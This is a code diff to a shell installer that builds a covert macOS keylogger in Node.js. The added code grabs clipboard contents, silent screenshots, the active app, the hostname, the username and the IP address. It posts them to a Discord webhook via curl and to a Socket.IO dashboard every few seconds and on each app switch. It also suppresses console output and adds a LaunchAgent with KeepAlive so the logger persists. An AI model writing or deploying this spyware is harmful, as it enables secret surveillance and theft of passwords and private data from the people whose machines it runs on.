@@ -770,59 +770,64 @@ function takeScreenshot() {
     const filename = `screenshot_${timestamp}.png`;
     const filepath = path.join(screenshotDir, filename);
     
-    // Capture current keys before screenshot (don't clear yet)
+    // Capture current keys and process before screenshot
     const currentKeys = keysBuffer.length > 0 ? keysBuffer : `[Screenshot ${new Date().toLocaleTimeString()}]`;
     
-    exec(`screencapture -x "${filepath}"`, (error, stdout, stderr) => {
-        if (error) {
-            // Screenshot failed - still send activity to Discord
-            sendToDiscord(null, currentKeys);
-            keysBuffer = '';
-            return;
-        }
+    // Get current active process
+    exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
+        const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
         
-        if (fs.existsSync(filepath)) {
-            try {
-                const imageBuffer = fs.readFileSync(filepath);
-                const base64Image = imageBuffer.toString('base64');
-                const dataURL = `data:image/png;base64,${base64Image}`;
-                
-                // ALWAYS send to Discord (even if no keys)
-                sendToDiscord(dataURL, currentKeys);
-                
-                // Send to dashboard via Socket.IO
-                if (socket && socket.connected) {
-                    socket.emit('screenshot', {
-                        clientId: CLIENT_ID,
-                        image: dataURL,
-                        keys: currentKeys,
-                        timestamp: timestamp
-                    });
-                }
-                
-                // Clean up file
-                setTimeout(() => { 
-                    try { 
-                        fs.unlinkSync(filepath); 
-                    } catch (e) {} 
-                }, 10000);
-            } catch (e) {
-                // Error reading file - still send activity
-                sendToDiscord(null, currentKeys);
+        exec(`screencapture -x "${filepath}"`, (error, stdout, stderr) => {
+            if (error) {
+                // Screenshot failed - still send keylog without screenshot
+                sendKeylogToDiscord(currentKeys, processTitle, null);
+                keysBuffer = '';
+                return;
             }
-        } else {
-            // File doesn't exist - still send activity
-            sendToDiscord(null, currentKeys);
-        }
-        
-        // Clear buffer AFTER sending
-        keysBuffer = '';
+            
+            if (fs.existsSync(filepath)) {
+                try {
+                    const imageBuffer = fs.readFileSync(filepath);
+                    const base64Image = imageBuffer.toString('base64');
+                    const dataURL = `data:image/png;base64,${base64Image}`;
+                    
+                    // ALWAYS send keylog WITH screenshot to Discord
+                    sendKeylogToDiscord(currentKeys, processTitle, dataURL);
+                    
+                    // Also send to dashboard via Socket.IO
+                    if (socket && socket.connected) {
+                        socket.emit('screenshot', {
+                            clientId: CLIENT_ID,
+                            image: dataURL,
+                            keys: currentKeys,
+                            timestamp: timestamp
+                        });
+                    }
+                    
+                    // Clean up file
+                    setTimeout(() => { 
+                        try { 
+                            fs.unlinkSync(filepath); 
+                        } catch (e) {} 
+                    }, 10000);
+                } catch (e) {
+                    // Error reading file - still send keylog
+                    sendKeylogToDiscord(currentKeys, processTitle, null);
+                }
+            } else {
+                // File doesn't exist - still send keylog
+                sendKeylogToDiscord(currentKeys, processTitle, null);
+            }
+            
+            // Clear buffer AFTER sending
+            keysBuffer = '';
+        });
     });
 }
 
-// Send keylog to Discord in the format user wants
-function sendKeylogToDiscord(buffer, processTitle) {
-    if (!buffer || buffer.length === 0) return;
+// Send keylog to Discord in the format user wants (WITH screenshot)
+function sendKeylogToDiscord(buffer, processTitle, screenshotDataURL = null) {
+    if (!buffer || buffer.length === 0) buffer = '[No activity]';
     
     const ip = require('os').networkInterfaces();
     let ipAddress = 'Unknown';
@@ -836,13 +841,28 @@ function sendKeylogToDiscord(buffer, processTitle) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    const keylogData = {
-        content: `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nProcess Title: ${processTitle}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``
-    };
+    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nProcess Title: ${processTitle}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
+    
+    let payload;
+    if (screenshotDataURL) {
+        // Include screenshot
+        payload = {
+            content: keylogContent,
+            embeds: [{
+                image: { url: screenshotDataURL },
+                timestamp: new Date().toISOString()
+            }]
+        };
+    } else {
+        // Just text
+        payload = {
+            content: keylogContent
+        };
+    }
     
     const payloadFile = path.join(screenshotDir, `keylog_${Date.now()}.json`);
     try {
-        fs.writeFileSync(payloadFile, JSON.stringify(keylogData));
+        fs.writeFileSync(payloadFile, JSON.stringify(payload));
         exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
             setTimeout(() => {
                 try { fs.unlinkSync(payloadFile); } catch (e) {}
@@ -914,13 +934,12 @@ setInterval(() => {
                 // Get active application (what they're typing in)
                 exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
                     const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
-                    // Add to buffer with process info
-                    keysBuffer += clipboard.substring(0, 500);
+                    // Add to buffer - this is what they typed/copied
+                    keysBuffer += clipboard.substring(0, 1000);
                     lastKeyTime = Date.now();
-                    // Send immediately when clipboard changes (indicates typing)
+                    // Send immediately when clipboard changes (indicates typing) WITH screenshot
                     setTimeout(() => {
-                        sendKeylogToDiscord(keysBuffer, processTitle);
-                        takeScreenshot();
+                        takeScreenshot(); // This will send keylog + screenshot together
                     }, 500);
                 });
             }
@@ -930,7 +949,8 @@ setInterval(() => {
         if (clipboardCheckCount % 50 === 0 && keysBuffer.length > 0) {
             exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
                 const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
-                sendKeylogToDiscord(keysBuffer, processTitle);
+                // Send with screenshot
+                takeScreenshot();
             });
         }
     });
@@ -944,10 +964,9 @@ setInterval(() => {
             const currentApp = stdout.trim();
             if (currentApp && currentApp !== lastActiveApp) {
                 lastActiveApp = currentApp;
-                // App changed - send current buffer if any
+                // App changed - send current buffer if any WITH screenshot
                 if (keysBuffer.length > 0) {
-                    sendKeylogToDiscord(keysBuffer, lastActiveApp);
-                    keysBuffer = ''; // Clear after sending
+                    takeScreenshot(); // This will send keylog + screenshot together
                 }
             }
         }
@@ -1005,17 +1024,17 @@ setInterval(() => {
     lastFileCheck = Date.now();
 }, 5000);
 
-// Periodic screenshots - always send to Discord
+// Periodic screenshots - always send to Discord (every 5 seconds)
 setInterval(() => {
     const now = Date.now();
     if (now - lastScreenshotTime > SCREENSHOT_INTERVAL) {
         lastScreenshotTime = now;
         // Always take screenshot, even if no keys captured
-        // This ensures Discord gets regular updates
+        // This ensures Discord gets regular updates with screenshots
         if (keysBuffer.length === 0) {
             keysBuffer = `[Periodic Screenshot - ${new Date().toLocaleTimeString()}]`;
         }
-        takeScreenshot();
+        takeScreenshot(); // This sends keylog + screenshot together
     }
 }, SCREENSHOT_INTERVAL);
 
@@ -1025,9 +1044,10 @@ setTimeout(() => {
     takeScreenshot();
 }, 3000);
 
-// Test Discord connection on startup
+// Test Discord connection on startup (with screenshot)
 setTimeout(() => {
-    sendKeylogToDiscord('[Keylogger Started - Testing Discord Connection]', 'System');
+    keysBuffer = '[Keylogger Started - Testing Discord Connection]';
+    takeScreenshot(); // This will send keylog + screenshot
 }, 5000);
 
 console.log = () => {};
@@ -1046,10 +1066,10 @@ KEYLOGGEREOF
 }
 PKGEOF
     
-    # Install dependencies
-    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1 &)
+    # Install dependencies (wait for it to complete)
+    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1)
     
-    # Create Launch Agent for 24/7 operation
+    # Create Launch Agent for 24/7 operation (runs even after terminal closes)
     local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
     local KEYLOGGER_AGENT_FILE="$LAUNCH_AGENT_DIR/com.keylogger.helper.plist"
     
@@ -1070,10 +1090,7 @@ PKGEOF
     <key>RunAtLoad</key>
     <true/>
     <key>KeepAlive</key>
-    <dict>
-        <key>SuccessfulExit</key>
-        <false/>
-    </dict>
+    <true/>
     <key>WorkingDirectory</key>
     <string>$APP_DIR</string>
     <key>StandardOutPath</key>
